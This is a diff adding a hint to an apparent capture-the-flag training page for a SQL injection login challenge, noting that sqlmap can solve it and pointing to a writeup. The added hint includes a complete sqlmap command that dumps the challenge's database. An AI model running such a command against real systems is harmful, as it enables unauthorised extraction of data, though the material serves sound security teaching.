@@ -6,5 +6,16 @@
     </section>
     {% endif %}
     <section>
+        <p>
+This challenge can easily be solved using a tool such as Sqlmap, an open-source tool that automates SQL injection flaws'
+detection and exploitation. The following command can be used to exploit the vulnerability with Sqlmap:
+        </p>
+            <pre><code data-trim data-noescape data-line-numbers="1-2">
+$ sqlmap -u http://&lt;IP&gt;/challenge3/login --data="username=admin&password=admin" 
+--level=5 --risk=3 --dbms=sqlite --technique=b --dump
+            </code></pre>
+        <p>
+            It is highly recommended to complete this challenge by building a custom script. For a guide on how to do this, see the provided writeup.
+        </p>
     </section>
 </div>
